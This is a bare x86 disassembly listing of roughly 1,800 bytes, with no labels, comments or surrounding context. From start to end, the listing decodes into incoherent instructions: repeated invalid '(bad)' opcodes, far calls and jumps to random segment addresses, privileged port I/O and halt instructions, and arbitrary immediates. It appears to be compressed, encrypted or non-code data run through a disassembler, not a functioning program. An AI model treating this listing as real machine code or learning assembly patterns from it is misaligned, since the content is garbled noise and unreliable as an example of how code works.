  43f323:	or     eax,0x803b2132
  43f328:	ror    BYTE PTR [eax],cl
  43f32a:	(bad)  
  43f32b:	cwde   
  43f32c:	xchg   BYTE PTR [ebx+ecx*2-0x1a],al
  43f330:	pop    ebx
  43f331:	mov    edx,0x1fa477aa
  43f336:	call   0x448b:0x5974726a
  43f33d:	jg     0x43f35d
  43f33f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f340:	in     al,0xf7
  43f342:	or     BYTE PTR [ebp-0x17],bh
  43f345:	call   0x129e:0xfbb2f7f7
  43f34c:	lea    esp,[eax-0x7]
  43f34f:	ret    0xf75b
  43f352:	sbb    BYTE PTR [eax+0x28a12dd0],ch
  43f358:	xchg   edx,eax
  43f359:	jns    0x43f384
  43f35b:	outs   dx,BYTE PTR ds:[esi]
  43f35c:	aad    0x9d
  43f35e:	xchg   esp,eax
  43f35f:	dec    edi
  43f360:	pop    esp
  43f361:	dec    ebx
  43f362:	jbe    0x43f36b
  43f364:	ret    0x827f
  43f367:	pop    ecx
  43f368:	mov    al,ds:0x5743000c
  43f36d:	fst    DWORD PTR gs:[esi+0x30]
  43f371:	sub    BYTE PTR [esi],ch
  43f373:	dec    edi
  43f374:	sub    ah,BYTE PTR [edi]
  43f376:	call   0xe6d6:0x8d5daef7
  43f37d:	push   ss
  43f37e:	icebp  
  43f37f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f380:	pop    eax
  43f381:	icebp  
  43f382:	sbb    DWORD PTR [edx],eax
  43f384:	fucomi st,st(0)
  43f386:	lds    edx,FWORD PTR [eax]
  43f388:	ror    DWORD PTR [ebp-0x79],0x92
  43f38c:	adc    BYTE PTR [edi-0x26],bh
  43f38f:	pop    edx
  43f390:	lods   eax,DWORD PTR ds:[esi]
  43f391:	loope  0x43f396
  43f393:	inc    eax
  43f394:	or     DWORD PTR [ebx],ecx
  43f396:	hlt    
  43f397:	jmp    0xfc9a:0x6a6c29f3
  43f39e:	loope  0x43f331
  43f3a0:	lods   eax,DWORD PTR ds:[esi]
  43f3a1:	xchg   esp,eax
  43f3a2:	dec    ebp
  43f3a3:	pushf  
  43f3a4:	repnz push cs
  43f3a6:	retf   0x32b8
  43f3a9:	scas   al,BYTE PTR es:[edi]
  43f3aa:	stos   DWORD PTR es:[edi],eax
  43f3ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f3ac:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  43f3ae:	and    DWORD PTR [eax],ecx
  43f3b0:	repz cmp BYTE PTR [ecx+eax*2],bh
  43f3b4:	mov    ch,0xe7
  43f3b6:	push   0x7d
  43f3b8:	push   edx
  43f3b9:	xchg   edx,eax
  43f3ba:	jge    0x43f3df
  43f3bc:	ror    DWORD PTR [ebp+0x1e669b9c],cl
  43f3c2:	sahf   
  43f3c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f3c4:	and    DWORD PTR [ebx+0x10a522a7],0x35b2818e
  43f3ce:	or     al,0x34
  43f3d1:	jecxz  0x43f394
  43f3d3:	lds    ebx,FWORD PTR [ebx]
  43f3d5:	or     ebp,DWORD PTR [ecx]
  43f3d7:	addr16 dec eax
  43f3d9:	ins    BYTE PTR es:[edi],dx
  43f3da:	neg    DWORD PTR [edx-0x35]
  43f3dd:	mov    ecx,0xa3282a3
  43f3e2:	sbb    DWORD PTR [edx+0x6b139dab],ebx
  43f3e8:	bound  esi,QWORD PTR [eax]
  43f3ea:	stos   BYTE PTR es:[edi],al
  43f3eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f3ec:	(bad)  
  43f3ed:	hlt    
  43f3ee:	jecxz  0x43f3ab
  43f3f0:	mov    ecx,0xb224b42b
  43f3f5:	pop    eax
  43f3f6:	sbb    ebp,DWORD PTR [eax+0x73]
  43f3f9:	cmp    eax,0x83c30d5
  43f3fe:	add    BYTE PTR [eax+0x5a4fb0d6],bl
  43f404:	xor    bl,cl
  43f406:	mov    ebx,0x730fb3af
  43f40b:	sub    eax,DWORD PTR [ebp*1-0x7e8d0d35]
  43f412:	loop   0x43f3bb
  43f414:	pop    eax
  43f415:	cmp    BYTE PTR [ebp+0x34],ah
  43f418:	sbb    ebx,DWORD PTR ds:0xd3acefac
  43f41e:	(bad)  
  43f41f:	(bad)  [edx+0x5ab66f44]
  43f425:	ins    BYTE PTR es:[edi],dx
  43f426:	into   
  43f427:	scas   al,BYTE PTR es:[edi]
  43f428:	inc    ebx
  43f429:	retf   0x4db4
  43f42c:	xor    dh,BYTE PTR [ecx+0x3fef1683]
  43f432:	call   0xd1eb:0x775368bc
  43f439:	test   BYTE PTR [eax],cl
  43f43b:	mov    al,ds:0x66c3a040
  43f440:	int    0x7b
  43f442:	mov    ds:0x9991c784,eax
  43f447:	cmp    DWORD PTR [edx+0x347da920],0x13ad55eb
  43f451:	or     edi,esi
  43f453:	pop    ebx
  43f454:	mov    WORD PTR [edi],cs
  43f456:	or     eax,0x94b9844e
  43f45b:	jo     0x43f447
  43f45d:	es popf 
  43f45f:	pop    es
  43f460:	outs   dx,BYTE PTR ds:[esi]
  43f461:	fisttp DWORD PTR [ebx+edx*2+0x72]
  43f465:	or     eax,DWORD PTR [ebx]
  43f467:	lds    ebp,FWORD PTR [edx-0x42e7f1f3]
  43f46d:	push   ss
  43f46e:	call   0xe65b:0xe4894221
  43f475:	mov    ebp,0x3ba4a7ff
  43f47a:	pop    ebx
  43f47b:	and    al,0xc1
  43f47d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f47e:	dec    ecx
  43f47f:	int    0xb3
  43f481:	sub    edi,0xfffffff8
  43f484:	sbb    BYTE PTR [edx+0x21],bh
  43f487:	xor    BYTE PTR [ebx+ecx*8+0xc],bh
  43f48b:	cmp    DWORD PTR [edi-0x45],ecx
  43f48e:	cmp    eax,0x9a16029c
  43f493:	xor    bh,BYTE PTR [eax+0x4c03d745]
  43f499:	popf   
  43f49a:	mov    eax,ds:0xd60ba2c7
  43f49f:	fld    DWORD PTR [ebx+eax*2+0x54]
  43f4a3:	push   ebp
  43f4a4:	ja     0x43f4b1
  43f4a6:	add    BYTE PTR ds:0x2fe0e223,dl
  43f4ac:	sbb    cl,BYTE PTR [esi-0x63]
  43f4af:	inc    esi
  43f4b0:	ins    BYTE PTR es:[edi],dx
  43f4b1:	pop    ebx
  43f4b2:	out    0xcd,eax
  43f4b4:	bound  ebp,QWORD PTR [eax+0x29]
  43f4b7:	add    eax,0xd17f0ba0
  43f4bc:	ins    DWORD PTR es:[edi],dx
  43f4bd:	sub    al,0x8
  43f4bf:	das    
  43f4c0:	pusha  
  43f4c1:	and    edx,edx
  43f4c3:	push   ds
  43f4c4:	push   esi
  43f4c5:	or     DWORD PTR [ebx-0x296bd358],esi
  43f4cb:	(bad)  
  43f4cc:	jbe    0x43f524
  43f4ce:	mov    fs,WORD PTR [esi+0x1a4d711c]
  43f4d4:	aad    0xb3
  43f4d6:	adc    BYTE PTR [edi+0x279b1374],dl
  43f4dc:	cli    
  43f4dd:	dec    edi
  43f4de:	or     DWORD PTR [ecx],eax
  43f4e0:	push   ds
  43f4e1:	pop    esp
  43f4e2:	push   ebx
  43f4e3:	fst    DWORD PTR [esi+0x59]
  43f4e6:	add    cl,bl
  43f4e8:	cmp    cl,BYTE PTR [ebx]
  43f4ea:	add    eax,0xc20744ac
  43f4ef:	cwde   
  43f4f0:	in     al,dx
  43f4f1:	jns    0x43f48d
  43f4f3:	push   0xffffffd0
  43f4f5:	and    DWORD PTR [eax+0x15041a62],ebx
  43f4fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f4fc:	cld    
  43f4fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f4fe:	add    BYTE PTR ds:0xdc5aadde,cl
  43f504:	sbb    al,0x34
  43f506:	call   0x7af0:0x9026e32f
  43f50d:	inc    ecx
  43f50e:	jbe    0x43f4b0
  43f510:	idiv   BYTE PTR [ecx-0x3076830d]
  43f516:	jmp    0x43f57f
  43f518:	add    dl,BYTE PTR [edi+0x21b2315e]
  43f51e:	lds    ecx,FWORD PTR [ecx]
  43f520:	arpl   WORD PTR [edx],ax
  43f522:	or     eax,0x5ebb0579
  43f527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f528:	jmp    0x2017:0x1dd4a6d7
  43f52f:	add    BYTE PTR [edx+0x22344a32],dh
  43f535:	in     al,dx
  43f536:	in     al,0x42
  43f538:	aad    0xa
  43f53a:	xor    edi,DWORD PTR fs:[edx]
  43f53d:	dec    edi
  43f53e:	sbb    BYTE PTR [edi-0x304b2884],dh
  43f544:	mov    dl,0xdd
  43f546:	adc    BYTE PTR [esp+edx*1+0x1e],0xbe
  43f54b:	jae    0x43f52e
  43f54d:	or     BYTE PTR [edx],bh
  43f54f:	aaa    
  43f550:	mov    bl,0x43
  43f552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f553:	test   DWORD PTR [edx+0x5f],ebx
  43f556:	pop    eax
  43f557:	ja     0x43f50b
  43f559:	enter  0xc3b,0xc6
  43f55d:	sub    al,0xf4
  43f55f:	mov    eax,0x4cbc0bfb
  43f564:	inc    ebp
  43f565:	and    DWORD PTR [ebx],0x0
  43f568:	adc    al,0x9a
  43f56a:	call   0xd7fe:0x6e0ab8fd
  43f571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f572:	and    eax,0x727579a7
  43f577:	add    edx,DWORD PTR [ecx-0x47]
  43f57a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f57b:	call   0x222:0x85a3fbb2
  43f582:	(bad)  
  43f583:	fcompp 
  43f585:	sbb    al,0x55
  43f587:	(bad)  
  43f588:	jp     0x43f58f
  43f58a:	xchg   ecx,eax
  43f58b:	mov    bl,0x15
  43f58d:	push   ds
  43f58e:	loope  0x43f597
  43f590:	jns    0x43f5a4
  43f592:	jmp    0x35f6:0x59afaff7
  43f599:	mov    dh,0x5b
  43f59b:	push   eax
  43f59c:	add    dh,BYTE PTR [esi]
  43f59e:	leave  
  43f59f:	clc    
  43f5a0:	dec    eax
  43f5a1:	or     ecx,DWORD PTR [ebp-0x6d]
  43f5a4:	dec    BYTE PTR [edx]
  43f5a6:	xchg   DWORD PTR [ebp+0x21],ecx
  43f5a9:	ficom  DWORD PTR [ebp-0x331aa2e2]
  43f5af:	and    al,0x6b
  43f5b1:	sub    eax,0xdca0e11
  43f5b6:	pop    edx
  43f5b7:	test   eax,0xae290b7d
  43f5bc:	or     BYTE PTR [ecx+0x79ea0ff9],0x9b
  43f5c3:	fmul   st,st(1)
  43f5c5:	lods   eax,DWORD PTR ds:[esi]
  43f5c6:	inc    ebx
  43f5c7:	pushf  
  43f5c8:	dec    ebx
  43f5c9:	aam    0x6e
  43f5cb:	jge    0x43f561
  43f5cd:	or     esp,esp
  43f5cf:	sbb    eax,0x7c94383d
  43f5d4:	inc    eax
  43f5d5:	aad    0x94
  43f5d7:	mov    esi,0x87d6a2f1
  43f5dc:	retf   0x773f
  43f5df:	cwde   
  43f5e0:	mov    DWORD PTR [eax-0x8],esi
  43f5e3:	fwait
  43f5e4:	iret   
  43f5e5:	xlat   BYTE PTR ds:[ebx]
  43f5e6:	popf   
  43f5e7:	mov    edx,0xd71d568f
  43f5ec:	dec    ecx
  43f5ed:	fild   WORD PTR [ebx-0x37]
  43f5f0:	mov    dl,0x7e
  43f5f2:	mov    esp,0x68d4a845
  43f5f7:	xchg   DWORD PTR [esi-0x27fd90f4],edx
  43f5fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f5fe:	jbe    0x43f5e7
  43f600:	lahf   
  43f601:	retf   0x7061
  43f604:	push   esp
  43f605:	dec    edi
  43f606:	call   0xac1:0x6da0811d
  43f60d:	mov    WORD PTR [esi-0x58a56459],cs
  43f613:	pop    ebp
  43f614:	push   ebp
  43f615:	xchg   ebx,eax
  43f616:	ja     0x43f67c
  43f618:	mov    dl,0xf0
  43f61a:	enter  0x439e,0xe4
  43f61e:	cld    
  43f61f:	gs adc eax,0x3208ad00
  43f625:	xchg   dl,ah
  43f627:	sub    eax,0x2898535e
  43f62c:	adc    BYTE PTR [edi-0x49],bl
  43f62f:	mov    ch,0x8b
  43f632:	and    al,0x26
  43f634:	adc    DWORD PTR [eax-0x66fc5870],0x46e8ae95
  43f63e:	push   cs
  43f63f:	and    DWORD PTR [edx+0x24c719f0],esi
  43f645:	or     eax,0x9139dc6
  43f64a:	or     ebp,ebx
  43f64c:	rcr    eax,0xf9
  43f64f:	bnd jb 0x43f62b
  43f652:	aas    
  43f653:	pop    edx
  43f654:	mov    dl,0x4e
  43f656:	pop    edi
  43f657:	and    al,0xc0
  43f659:	pop    edx
  43f65a:	mov    dl,0x22
  43f65c:	inc    edx
  43f65d:	jae    0x43f6ab
  43f65f:	test   eax,0xc65e8587
  43f664:	rcl    BYTE PTR [ecx-0x37],cl
  43f667:	pop    ebx
  43f668:	lea    ecx,[ebx-0x66]
  43f66b:	ss jb  0x43f673
  43f66e:	inc    esi
  43f66f:	test   DWORD PTR [eax+0x5c],edx
  43f672:	and    ah,BYTE PTR [esi+0x1daec7a3]
  43f678:	rcr    BYTE PTR [esp-0x5afcbf95],cl
  43f67f:	jge    0x43f640
  43f681:	mov    esi,eax
  43f683:	lds    ebp,FWORD PTR [ecx-0x1e]
  43f686:	mov    bl,0xf2
  43f688:	push   ds
  43f689:	add    ch,dh
  43f68b:	cmp    edi,ebp
  43f68d:	scas   al,BYTE PTR es:[edi]
  43f68e:	call   0xc5f1:0x69c626f3
  43f695:	in     eax,dx
  43f696:	call   0x912:0x9fac6469
  43f69d:	cdq    
  43f69e:	pop    ss
  43f69f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f6a0:	mov    WORD PTR [edx],?
  43f6a2:	dec    eax
  43f6a3:	sub    BYTE PTR [edx-0x4d8dcf48],bh
  43f6a9:	in     al,dx
  43f6aa:	add    al,0x54
  43f6ac:	mov    al,ds:0x44ebaba8
  43f6b1:	or     eax,DWORD PTR [ebp+0x70]
  43f6b4:	mov    WORD PTR [ebp+0x44],ss
  43f6b7:	cmp    ch,BYTE PTR [ebx+0x4d]
  43f6ba:	call   0x8e0:0xcb5e54b9
  43f6c1:	pop    edi
  43f6c2:	mov    esi,0x793b7aa7
  43f6c7:	data16 add cl,BYTE PTR [edi]
  43f6ca:	outs   dx,BYTE PTR ds:[esi]
  43f6cb:	ds mov cl,0xc2
  43f6ce:	mov    ah,0xba
  43f6d0:	or     DWORD PTR [ebx-0x7c],0xd78b5247
  43f6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f6d8:	sbb    edx,DWORD PTR [edx+0x5]
  43f6db:	in     al,0x5
  43f6dd:	outs   dx,BYTE PTR ds:[esi]
  43f6de:	mov    cl,0x80
  43f6e0:	mov    ch,0xcc
  43f6e2:	fwait
  43f6e3:	sbb    ah,BYTE PTR [ecx+0x67]
  43f6e6:	stos   DWORD PTR es:[edi],eax
  43f6e7:	xchg   ebx,eax
  43f6e8:	dec    ebx
  43f6e9:	pop    ebx
  43f6ea:	jb     0x43f74e
  43f6ec:	jno    0x43f6f7
  43f6ee:	mov    eax,ds:0x547f58b9
  43f6f3:	pop    ss
  43f6f4:	jb     0x43f680
  43f6f6:	xchg   edx,eax
  43f6f8:	mov    dh,0x4d
  43f6fa:	cmp    al,0x0
  43f6fc:	sti    
  43f6fd:	xchg   esp,eax
  43f6fe:	and    DWORD PTR [edi],esp
  43f700:	mov    ebp,0xc8fe0abd
  43f705:	ins    BYTE PTR es:[edi],dx
  43f706:	call   0x7509:0xf7c7b907
  43f70d:	jne    0x43f700
  43f70f:	fmul   DWORD PTR [esi+0x17]
  43f712:	or     DWORD PTR [ebx+0x68548b20],0x7e2bca6d
  43f71c:	mov    dl,0x68
  43f71e:	adc    edx,DWORD PTR [eax-0x98c85b]
  43f724:	test   BYTE PTR [edi-0x74],bh
  43f727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f728:	shr    BYTE PTR [ebx+0x38e68d32],0x75
  43f72f:	jnp    0x43f6e1
  43f731:	arpl   cx,cx
  43f733:	mov    edi,0x470b7adc
  43f738:	dec    eax
  43f739:	pop    esi
  43f73a:	mov    bh,0xa4
  43f73c:	mov    ah,0x9e
  43f73e:	retf   0x7d51
  43f741:	sbb    eax,0x123a932a
  43f746:	call   0xca5e:0x53b21162
  43f74d:	sbb    DWORD PTR ds:[esi+ebx*1+0x7189e131],esp
  43f755:	bound  ebx,QWORD PTR [edx-0x30f2aedf]
  43f75b:	mov    BYTE PTR [ebx+0x37],0xe3
  43f75f:	mov    ds:0x66921ce2,al
  43f764:	je     0x43f70b
  43f766:	sbb    al,dl
  43f768:	sub    DWORD PTR [edx+0x6ad1a7bf],eax
  43f76e:	sub    BYTE PTR [ecx],ch
  43f770:	das    
  43f771:	inc    eax
  43f772:	xchg   esp,eax
  43f773:	imul   esi,DWORD PTR [ebx+0x8b195fd],0x67
  43f77a:	cmp    bl,ch
  43f77c:	inc    edx
  43f77d:	arpl   bx,bx
  43f77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f780:	cwde   
  43f781:	imul   esp,DWORD PTR [ebp-0x4b9975f5],0x2850bc3d
  43f78b:	mov    ah,0xca
  43f78d:	and    al,0x31
  43f78f:	xchg   DWORD PTR [eax-0x4334c1ef],edi
  43f795:	or     ebp,DWORD PTR [esi+0x38c07f42]
  43f79b:	sti    
  43f79c:	rcl    BYTE PTR [ebx-0x66],1
  43f79f:	(bad)  
  43f7a0:	ja     0x43f78e
  43f7a2:	mov    esi,0x62e463f0
  43f7a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f7a8:	shl    DWORD PTR [ebp-0x68],cl
  43f7ab:	data16 fisub DWORD PTR [ecx+ebx*1]
  43f7af:	or     DWORD PTR [edx-0x7562be23],esi
  43f7b5:	push   esi
  43f7b6:	daa    
  43f7b7:	push   es
  43f7b8:	xor    dh,BYTE PTR [ebx+0x10d2a716]
  43f7be:	add    eax,0x4f48e58d
  43f7c3:	xchg   BYTE PTR [edx-0x7df12a0],dh
  43f7c9:	ss inc ebp
  43f7cb:	stc    
  43f7cc:	jg     0x43f7e5
  43f7ce:	stos   DWORD PTR es:[edi],eax
  43f7cf:	mov    ebp,0x6797954e
  43f7d4:	pop    esp
  43f7d5:	xchg   ebx,eax
  43f7d6:	ret    
  43f7d7:	or     esp,DWORD PTR [eax]
  43f7d9:	rcr    DWORD PTR [edx+0x5168e565],cl
  43f7df:	push   esi
  43f7e0:	pop    es
  43f7e1:	jo     0x43f7df
  43f7e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f7e4:	cs je  0x43f7ea
  43f7e7:	cmc    
  43f7e8:	sti    
  43f7e9:	sbb    al,0xe4
  43f7eb:	adc    al,0xb3
  43f7ed:	or     DWORD PTR [ebp-0x41],esp
  43f7f0:	call   0x4dc8:0x706ce743
  43f7f7:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  43f7f9:	dec    edi
  43f7fa:	fimul  DWORD PTR [ebp-0x49]
  43f7fd:	xchg   DWORD PTR [edx-0x59],edx
  43f800:	mov    al,ds:0xdacabe97
  43f805:	dec    bh
  43f807:	ror    BYTE PTR [esi-0x2cd8b3b7],cl
  43f80d:	sbb    ch,BYTE PTR [ebp+eiz*4+0x5b]
  43f811:	or     al,0x45
  43f813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f814:	and    BYTE PTR [ecx-0x19eaa965],ch
  43f81a:	rol    DWORD PTR [esi-0x4e],1
  43f81d:	ss sti 
  43f81f:	and    bh,BYTE PTR [ebx+0x1da2e052]
  43f825:	or     ecx,ebp
  43f827:	mov    bl,0x79
  43f829:	mov    esp,0x9939157f
  43f82e:	call   0x5cd2:0x981cfd36
  43f835:	imul   esp,DWORD PTR [eax-0x59],0xffffffc5
  43f839:	mov    edi,0xeb02d585
  43f83e:	iret   
  43f83f:	sub    al,ah
  43f841:	pop    ebx
  43f842:	popf   
  43f843:	xor    al,0x9d
  43f845:	sub    ebx,DWORD PTR [eax]
  43f847:	inc    eax
  43f848:	push   edx
  43f849:	aam    0xc
  43f84b:	stos   DWORD PTR es:[edi],eax
  43f84c:	cmp    ah,BYTE PTR [edi]
  43f84e:	sub    DWORD PTR [ebx],esp
  43f850:	into   
  43f851:	or     ebx,DWORD PTR [ebx]
  43f853:	xchg   ebx,eax
  43f854:	(bad)  
  43f858:	mov    dl,0xcf
  43f85a:	mov    bh,0x1c
  43f85c:	jg     0x43f81c
  43f85e:	fnsave [edx-0x1d]
  43f861:	or     ah,BYTE PTR [edi-0x55]
  43f864:	std    
  43f865:	pop    ebx
  43f866:	mul    BYTE PTR [edx-0x1a]
  43f869:	fisttp DWORD PTR [eax+0x38]
  43f86c:	mov    esp,0xbd3f149f
  43f871:	sub    esp,DWORD PTR [eax-0x7386f9aa]
  43f877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f878:	aaa    
  43f879:	sub    al,0xa8
  43f87b:	aam    0xf1
  43f87d:	ds or  al,0x45
  43f880:	retf   
  43f881:	scas   eax,DWORD PTR es:[edi]
  43f882:	mov    al,ds:0xda0bb7fc
  43f887:	and    al,0x2f
  43f889:	mov    ebx,0xb4aefd1
  43f88e:	std    
  43f88f:	jl     0x43f852
  43f891:	adc    eax,0xde728b0b
  43f896:	call   0x689e:0xba2f1638
  43f89d:	test   al,0x2a
  43f89f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f8a0:	int3   
  43f8a1:	lock in eax,0x1
  43f8a4:	out    0xcd,al
  43f8a6:	repz pop esi
  43f8a8:	mov    dl,0x29
  43f8aa:	dec    eax
  43f8ab:	mov    cl,0x16
  43f8ad:	pop    ecx
  43f8ae:	pop    edx
  43f8af:	xor    ebp,ebx
  43f8b1:	or     al,0x31
  43f8b3:	cld    
  43f8b4:	xor    al,0x27
  43f8b6:	sub    al,0xf7
  43f8b8:	addr16 and al,0x5f
  43f8bb:	fild   DWORD PTR [edx]
  43f8bd:	pop    esi
  43f8be:	lea    eax,[ecx]
  43f8c0:	sub    ecx,esp
  43f8c2:	call   0x996e:0x27a52d34
  43f8c9:	or     ecx,esp
  43f8cb:	xchg   ebx,eax
  43f8cc:	ss sub al,0x15
  43f8cf:	scas   al,BYTE PTR es:[edi]
  43f8d0:	fcomp  QWORD PTR [esi-0x66]
  43f8d3:	pop    edi
  43f8d4:	int3   
  43f8d5:	xchg   edx,eax
  43f8d6:	cmp    edx,DWORD PTR [eax-0x584d0f9d]
  43f8dc:	test   al,0x58
  43f8de:	shld   DWORD PTR [edx+0x2284c649],eax,0x97
  43f8e6:	call   0x7240:0x4d3031af
  43f8ed:	rol    edi,cl
  43f8ef:	cwde   
  43f8f0:	mov    ch,0xff
  43f8f2:	sbb    edi,DWORD PTR [ebx-0x77b3c692]
  43f8f8:	pop    ebx
  43f8f9:	xor    al,0x7a
  43f8fb:	enter  0xa83,0x9e
  43f8ff:	in     al,dx
  43f900:	and    al,0x7b
  43f902:	push   edx
  43f903:	mov    eax,ds:0x5b2ec709
  43f908:	mov    bl,0x8b
  43f90a:	in     eax,0xda
  43f90c:	stos   DWORD PTR es:[edi],eax
  43f90d:	retf   0xfa33
  43f910:	repnz sub esp,0x3c0b0d45
  43f917:	push   esi
  43f918:	sub    eax,ecx
  43f91a:	enter  0x86ad,0x3a
  43f91e:	call   0x2f2d:0x1d97dcf6
  43f925:	pop    ebx
  43f926:	(bad)  
  43f927:	mov    al,ds:0x823ea4dd
  43f92c:	adc    al,0xea
  43f92e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f92f:	add    eax,0x5714c7ae
  43f934:	mov    ebp,0xc0dd1de2
  43f939:	or     ebx,DWORD PTR [edx]
  43f93b:	jnp    0x43f915
  43f93d:	and    ah,dl
  43f93f:	mov    ebx,0x395808a6
  43f944:	in     eax,0x4c
  43f946:	or     BYTE PTR [eax+0x43933b5d],dl
  43f94c:	jmp    0xb32ee923
  43f951:	int    0xdf
  43f953:	aaa    
  43f954:	out    0x3a,al
  43f956:	mov    eax,0x84081f5d
  43f95b:	xor    BYTE PTR [eax+0x2a16c8e2],al
  43f961:	add    ebx,0xffffffc7
  43f964:	mov    dl,0x1d
  43f966:	pop    ecx
  43f967:	and    eax,DWORD PTR [ecx+0x3e]
  43f96a:	frstor [esi+0x1eee0b15]
  43f970:	in     al,dx
  43f971:	or     al,cl
  43f973:	dec    eax
  43f974:	xor    BYTE PTR [ebx-0x66],bh
  43f977:	inc    ebx
  43f978:	out    0x4,eax
  43f97a:	cmp    BYTE PTR [ecx],0xbf
  43f97d:	fprem  
  43f97f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f980:	xor    eax,0xc5bf8ea7
  43f985:	push   esp
  43f986:	fwait
  43f987:	jecxz  0x43f9e7
  43f989:	retf   
  43f98a:	fwait
  43f98b:	pop    edx
  43f98c:	mov    ebp,0x85a0c096
  43f991:	retf   0x3d6e
  43f994:	ss pcmpgtd mm1,mm3
  43f998:	jns    0x43f9c3
  43f99a:	sbb    BYTE PTR [edi],ah
  43f99c:	ror    ebx,cl
  43f99e:	inc    esi
  43f99f:	test   BYTE PTR [ecx+0x38f332fc],dh
  43f9a5:	xchg   ebx,eax
  43f9a6:	jecxz  0x43f9bf
  43f9a8:	or     BYTE PTR [esi-0x41ab4701],dh
  43f9ae:	jp     0x43f98a
  43f9b0:	mov    dl,0xa2
  43f9b2:	push   edi
  43f9b3:	inc    ebp
  43f9b4:	aaa    
  43f9b5:	mov    al,ds:0x29b2c4f8
  43f9ba:	test   al,0x7f
  43f9bc:	and    ebp,edi
  43f9be:	inc    ebp
  43f9bf:	pusha  
  43f9c0:	pop    ss
  43f9c1:	or     eax,edx
  43f9c3:	and    BYTE PTR [ebp+0x496ddedb],dl
  43f9c9:	xchg   ebp,eax
  43f9ca:	test   BYTE PTR [ebx-0x29659dd0],al
  43f9d0:	outs   dx,BYTE PTR ds:[esi]
  43f9d1:	and    BYTE PTR [edi],0xb2
  43f9d4:	outs   dx,DWORD PTR ds:[esi]
  43f9d5:	or     edi,DWORD PTR [esi+0x68]
  43f9d8:	xchg   esp,eax
  43f9d9:	dec    DWORD PTR [edx]
  43f9db:	sbb    eax,0x3b9abb82
  43f9e0:	pop    ds
  43f9e1:	pop    eax
  43f9e2:	out    dx,eax
  43f9e3:	sti    
  43f9e4:	cld    
  43f9e5:	cmp    dl,BYTE PTR [edi]
  43f9e7:	mov    al,ds:0x2000e320
  43f9ec:	sti    
  43f9ed:	fisttp DWORD PTR [esi]
  43f9ef:	inc    esp
  43f9f0:	sub    eax,0xd5529a7c
  43f9f5:	sti    
  43f9f6:	frstor [ecx]
  43f9f8:	xchg   ebp,eax
  43f9f9:	jbe    0x43fa5a
  43f9fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f9fc:	add    DWORD PTR [ebp-0x1f],esi
  43f9ff:	loope  0x43fa40
  43fa01:	xor    DWORD PTR [ebp+0x2896b2a2],0x64
  43fa08:	daa    
  43fa09:	adc    al,0xdd
  43fa0b:	xor    edx,DWORD PTR [esi]
  43fa0d:	or     edi,ebp
  43fa0f:	fbld   TBYTE PTR [ecx-0x76]
  43fa12:	mov    al,0x90
  43fa14:	(bad)  
  43fa16:	xchg   esp,eax
  43fa17:	test   al,0x48
  43fa19:	sub    ebp,edx
  43fa1b:	inc    edi
  43fa1c:	shl    BYTE PTR [edx+0x4d],0x5e
  43fa20:	fnstsw WORD PTR [edi+0x41]
  43fa23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fa24:	lock inc eax
  43fa26:	mov    bh,0x1a
  43fa28:	jne    0x43fa80
  43fa2a:	ret    0xcb57
  43fa2d:	jp     0x43f9c9
  43fa2f:	push   cs
  43fa30:	or     al,0x0
  43fa32:	std    
  43fa33:	sar    DWORD PTR [edx-0x3f],0x68
  43fa37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fa38:	add    ebx,DWORD PTR [edi]
  43fa3a:	dec    edx
  43fa3b:	fcom   st(3)
  43fa3d:	sbb    BYTE PTR [ebx],al
  43fa3f:	xor    BYTE PTR [edx-0x158ff9f1],0xa9
  43fa46:	imul   edi,DWORD PTR ds:0xb7c29e56,0xc99ba0c5
  43fa50:	jmp    FWORD PTR [esi]
  43fa52:	dec    esp
  43fa53:	js     0x43fac9
  43fa55:	sbb    al,0x6e
  43fa57:	mov    cl,0x85
  43fa59:	or     esp,DWORD PTR [ecx]
  43fa5b:	mov    DWORD PTR [esi],ebp
  43fa5d:	push   ebx
  43fa5e:	xor    DWORD PTR [ebx+0x1d],0xffffffc6
  43fa62:	test   BYTE PTR [ebx],cl
  43fa64:	push   ecx
  43fa65:	xchg   edx,eax
  43fa66:	pop    edx
  43fa67:	lds    edx,FWORD PTR [ebx]
  43fa69:	push   eax
  43fa6a:	inc    esp
  43fa6b:	xchg   BYTE PTR [ebx+eiz*1],dh
  43fa6e:	mov    ecx,DWORD PTR [ebp+0x4c]
  43fa71:	or     edx,DWORD PTR [ecx-0x64c8ba45]
  43fa77:	xor    DWORD PTR [edi-0x39],eax
  43fa7a:	add    ch,BYTE PTR [edx]
  43fa7c:	mov    ebx,0x9d2e9d44
  43fa81:	or     esi,DWORD PTR [esi+0x66]
  43fa84:	pop    ss
  43fa85:	test   esp,esp
  43fa87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
